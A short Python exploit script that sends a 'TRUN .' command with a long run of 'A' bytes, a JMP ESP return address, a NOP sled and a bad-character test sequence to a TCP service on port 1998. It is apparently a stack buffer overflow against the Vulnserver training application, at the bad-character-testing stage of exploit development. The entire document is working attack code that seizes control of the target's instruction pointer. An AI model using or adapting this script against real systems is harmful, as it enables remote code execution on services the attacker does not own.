#!/usr/bin/python

import socket
import sys

server = sys.argv[1]
sport = 1998


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print(s.recv(1024))

attack = b'A' * 2311
attack += b'\xb0\x12\x50\x62' # 0x625012b0 hit0_0 ffe4

attack2 = b"".join([bytes([i]) for i in range(1,256)])
attack += b"\x90" * 100 + attack2
payload = (b'TRUN .' + attack + b'\r\n')
s.send(payload)
print(s.recv(1024))
s.send(b'EXIT\r\n')
print(s.recv(1024))
s.close()

